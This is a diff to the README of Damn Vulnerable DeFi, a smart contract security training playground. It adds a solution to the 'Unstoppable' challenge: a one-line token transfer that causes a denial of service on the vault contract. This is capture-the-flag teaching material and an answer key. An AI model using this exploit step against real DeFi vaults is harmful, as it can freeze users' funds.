@@ -1,3 +1,9 @@
+# Solutions
+1. Unstoppable
+DoS Vault contract by sending 10 DVT tokens.
+`token.transfer(address(vault), 10 ether);`
+
+-----------------------
 # Damn Vulnerable DeFi
 
 Damn Vulnerable DeFi is _the_ smart contract security playground for developers, security researchers and educators.
